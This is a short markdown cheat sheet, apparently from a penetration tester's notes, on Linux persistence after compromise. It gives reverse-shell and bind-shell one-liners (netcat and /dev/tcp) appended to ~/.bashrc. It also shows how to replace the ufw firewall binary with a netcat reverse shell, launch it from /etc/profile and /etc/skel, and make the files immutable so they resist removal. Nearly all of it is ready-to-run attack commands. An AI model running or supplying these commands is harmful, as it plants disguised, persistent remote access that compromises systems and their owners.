# Living off the Land

## 01 - User Profile

- Reverse Shell

```
$ echo "nc -e /bin/bash <IP> <PORT> 2>/dev/null &" >> ~/.bashrc

$ echo "/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &" >> ~/.bashrc
```

Even when the user logs out the shell will still be running.

```
$ echo "nohup <commands> &" >> ~/.bashrc
```

- Bind Shell

`$ echo "nc -e /bin/bash -lnvp 8080 &" >> ~/.bashrc`

## 02 - Global System Profile

- Reverse Shell

```
$ sudo mv /usr/bin/ufw /tmp/ufw.bak

$ sudo echo "nc -e /bin/bash <IP> <PORT> 2>/dev/null &" > /usr/bin/ufw

$ sudo echo "/usr/bin/ufw &" >> /etc/profile

$ sudo echo "/usr/bin/ufw &" >> /etc/skel/.profile

$ sudo chmod +sss /usr/bin/ufw

$ chattr +i /etc/skel/.profile /etc/profile /usr/bin/ufw
```

---
## References

- [[Linux Post Exploitation Persistence References]]